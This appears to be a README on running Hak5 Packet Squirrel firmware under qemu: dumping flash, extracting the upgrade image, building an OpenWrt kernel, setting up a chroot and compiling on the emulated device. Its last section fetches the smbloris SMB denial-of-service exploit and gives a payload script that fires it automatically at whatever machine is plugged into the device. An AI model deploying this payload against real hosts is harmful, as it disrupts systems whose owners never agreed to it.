# Running packet squirrel software in qemu

The idea was to learn more about the packet squirrel, https://www.hak5.org/gear/packet-squirrel
```
    Atheros AR9331 SoC at 400 MHz MIPS
    16 MB Onboard Flash
    64 MB DDR2 RAM
    2x 10/100 Ethernet Port
    USB 2.0 Host Port
    4-way payload select switch
    RGB Indicator LED
    Scriptable Push-Button
    Power: USB 5V 120mA average draw
    Dimensions: 50 x 39 x 16 mm
    Weight: 24 grams
```

Another purpose of this is to compile packet_squirrel binaries under qemu

This can be done i 3 ways.
1. Cross compile
2. Run on the packet squirrel with gcc-toolchain on a usb-flashdrive
3. qemu

Here we try option 3


# starting qemu without chroot
qemu-system-mips -kernel  -kernel openwrt-malta-be-vmlinux.elf -M malta \
                     -hda openwrt-malta-be-root.ext4 \
                     -append "root=/dev/sda board=HAK5-SQUIRREL console=ttyS0" \
                     -nographic



```
BusyBox v1.23.2 (2017-09-06 11:27:56 UTC) built-in shell (ash)

    __ (\\_          Packet Squirrel          _//) __
   (_ \( '.)             by Hak5             (.' )/ _)
     ) \ _))     _                     __    ((_ / (
    (_   )_     (') Nuts for Networks ((')    _(   _)

```



First i logged onto the packet squirel and did some information gathering, see the file info.txt [live squirrel](./info.txt)

Then I checked out the the upgrade upgrade-1.2.bin file. The easiest way to do this is by renaming to upgrade-1.2.bin.7z
Thunar was able to explore this file without a problem. Symbolic inks are however lost. The /sbin/init file is the first process to be run, in order to see what it does i need to install the strace package.




# Dumping the filesystem
```
On your host system make a dump of the
ssh root@172.16.32.1 "dd if=/dev/mtdblock2 " | dd of=block2.7z
After this you have a file that can later be recreated.

> file block2.7z 
block2: Squashfs filesystem, little endian, version 4.0, 13685232 bytes, 2386 inodes, blocksize: 262144 bytes, created: Fri Jul 14 00:58:36 2017

Create an image that can be used in qemu,
>qemu-img create -f raw openwrt-malta-be-root.ext4 4G

>mkfs.ext4 -F openwrt-malta-be-root.ext4
>mkdir /mnt/tmp
>mount  openwrt-malta-be-root.ext4  /mnt/tmp 
```

# Get gcc packages to install

```
/mnt/tmp/tt
cd /mnt/tmp/tt
https://archive.openwrt.org/chaos_calmer/15.05.1/ar71xx/generic/packages/base/valgrind-cachegrind_3.10.0-1_ar71xx.ipk
wget https://archive.openwrt.org/chaos_calmer/15.05.1/ar71xx/generic/packages/base/libreadline_6.3-1_ar71xx.ipk
wget https://archive.openwrt.org/chaos_calmer/15.05.1/ar71xx/generic/packages/base/ar_2.24-3_ar71xx.ipk
wget https://archive.openwrt.org/chaos_calmer/15.05.1/ar71xx/generic/packages/base/strace_4.8-1_ar71xx.ipk
wget https://downloads.openwrt.org/chaos_calmer/15.05.1/ar71xx/generic/packages/base/libbfd_2.24-3_ar71xx.ipk
wget https://downloads.openwrt.org/chaos_calmer/15.05.1/ar71xx/generic/packages/base/libopcodes_2.24-3_ar71xx.ipk
wget https://downloads.openwrt.org/chaos_calmer/15.05.1/ar71xx/generic/packages/base/objdump_2.24-3_ar71xx.ipk
wget https://downloads.openwrt.org/chaos_calmer/15.05.1/ar71xx/generic/packages/base/binutils_2.24-3_ar71xx.ipk
wget https://downloads.openwrt.org/chaos_calmer/15.05.1/ar71xx/generic/packages/packages/gcc_4.8.3-1_ar71xx.ipk
wget https://archive.openwrt.org/chaos_calmer/15.05.1/ar71xx/generic/packages/base/gdb_7.8-2_ar71xx.ipk
wget https://archive.openwrt.org/chaos_calmer/15.05.1/ar71xx/generic/packages/base/gdbserver_7.8-2_ar71xx.ipk
wget https://archive.openwrt.org/chaos_calmer/15.05.1/ar71xx/generic/packages/base/libthread-db_0.9.33.2-1_ar71xx.ipk
wget https://gist.githubusercontent.com/marcan/6a2d14b0e3eaa5de1795a763fb58641e/raw/565befecf4d9a4a27248d027a90b6e3e5994b5b6/smbloris.c
```

Extract all the files from the upgrade-1.2.bin to your /mnt/tmp
If you do this through thunar links are lost, a better way to do this is to use firmware-mod-kit.

wget https://storage.googleapis.com/packetsquirrel/upgrades/upgrade-1.2.bin

You can use this
sudo apt-get install git build-essential zlib1g-dev liblzma-dev python-magic
git clone https://github.com/openwrt-stuff/firmware-mod-kit
cd firmware-mod-kit
./extract-firmware.sh upgrade-1.2.bin
> cp -av fmk/rootfs/* /mnt/tmp
> sudo umount /mnt/tmp

```
file firmware-mod-kit/fmk/rootfs/sbin/init
 ELF 32-bit MSB  executable, MIPS, MIPS32 rel2 version 1, dynamically linked (uses shared libs), corrupted section header size
file sbin/init: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, corrupted section header size
```

https://github.com/openwrt-stuff/firmware-mod-kit

> mkdir /tmp/block2



# build your own openwrt kernel, with vagrant
or use the elf file in the qemu directory.
cd build

```
>vagrant up
>vagrant ssh
>git clone https://github.com/hak5/wifipineapple-openwrt
>cd wifipineapple-openwrt
>make menuconfig
>cp /vagrant_data/.config .
```

The .config file contains BE MIPS/Mach support to run in qemu

When finnished you should  have a bin/malta directory,
to transfer them to host do
```
> cp bin/malta/openwrt-malta-be-vmlinux-initramfs.elf /vagrant_data
```

# Original openwrt sources
You also can maybe use this one to build qemu openwrt image,
>git clone -b chaos_calmer git://github.com/openwrt/chaos_calmer.git


Dont run qemu in vagrant, it will result in illegal instruction.
Try to get a newer version of qemu and run on host
sudo apt-get qemu-system

# Or use precompiled kernel in directory qemu
openwrt-malta-be-vmlinux-initramfs.elf 

I use version 2.11.0
>qemu-system-mips --version
QEMU emulator version 2.11.0
If you run the binaries in qemu and get,
Invalid Opcode, then your version of qemu is to old.


# Start qemu
qemu-system-mips -M malta -kernel openwrt-malta-be-vmlinux-initramfs.elf -hda openwrt-malta-be-root.ext4 -append "board=HAK5-SQUIRREL console=ttyS0" -nographic
```
BusyBox v1.23.2 (2018-01-18 12:24:13 UTC) built-in shell (ash)

  _______                     ________        __
 |       |.-----.-----.-----.|  |  |  |.----.|  |_
 |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
 |_______||   __|_____|__|__||________||__|  |____|
          |__| W I R E L E S S   F R E E D O M
 -----------------------------------------------------
 CHAOS CALMER (Chaos Calmer, r49610)
 -----------------------------------------------------
  * 1 1/2 oz Gin            Shake with a glassful
  * 1/4 oz Triple Sec       of broken ice and pour
  * 3/4 oz Lime Juice       unstrained into a goblet.
  * 1 1/2 oz Orange Juice
  * 1 tsp. Grenadine Syrup
 -----------------------------------------------------
```

After booting to openWrt

```
mkdir /mnt/ps
mount  /dev/sda /mnt/ps
```


# Setting up chroot
In order to run all the original binaries we dumped on a persistent fileystem.
```
TARGETDIR="/mnt/ps"
mount -t proc proc $TARGETDIR/proc
mount -t sysfs sysfs $TARGETDIR/sys
#mount -t devtmpfs devtmpfs $TARGETDIR/dev
mkdir /mnt/ps/dev/pts
mkdir /mnt/ps/dev/shm
mount -t tmpfs tmpfs $TARGETDIR/dev/shm
mount -t devpts devpts $TARGETDIR/dev/pts
```


# CHROOT
    chroot /mnt/ps
Now you should have an environment that matches the squirrel better


# Install packages
```
cd tt
 opkg install libbfd_2.24-3_ar71xx.ipk 
 opkg install libopcodes_2.24-3_ar71xx.ipk
 opkg install objdump_2.24-3_ar71xx.ipk
 opkg install ar_2.24-3_ar71xx.ipk
 opkg install binutils_2.24-3_ar71xx.ipk 
 opkg install gcc_4.8.3-1_ar71xx.ipk
```

# Squirrel framework
These are part of the switch/leds framework, study them
/usr/bin/squirrel_framework
/usr/bin/SWITCH

When finished
>exit
>halt

# Test compilation 

gcc smbloris.c -o smbloris

Copy file to i.e. /usr/bin, replace /root/payloads/switch2/payload.sh
Read more here https://astr0baby.wordpress.com/2017/11/17/packet-squirrel-gcc-and-smbloris/
```
# Show SETUP LED 
LED SETUP 
# Set the network mode to NAT 
NETMODE NAT 
sleep 5

# You may want to increase your local conntrack limit
echo 1200000 > /proc/sys/net/netfilter/nf_conntrack_max

# Get the IP address for the connected target machine 
ip="$(cat /var/dhcp.leases | awk '{print $3}')"

# Execute smbloris against the target IP 
/usr/bin/smbloris eth0 1.1.1.1 255.255.255.254 $ip &
```

# Links
https://astr0baby.wordpress.com/2017/11/13/packet-squirrel-hands-on/

https://reverseengineering.stackexchange.com/questions/4817/dumping-firmware-through-mtdblock-device


https://web.archive.org/web/20160421212952/https://fosiao.com/content/running-openwrt-under-qemu

http://aleph0.info/software/lisp-forth-openwrt/openwrt-on-qemu.html


https://integriography.wordpress.com/2015/03/16/mounting-a-jffs2-dd-image-in-linux/


https://integriography.wordpress.com/2015/03/15/drone-forensics-an-overview/



# Here is some good info about memory technology devices

https://wiki.dave.eu/index.php/Memory_Tecnology_Device_(MTD)

https://free-electrons.com/blog/managing-flash-storage-with-linux/


http://aleph0.info/software/lisp-forth-openwrt/openwrt-on-qemu.html

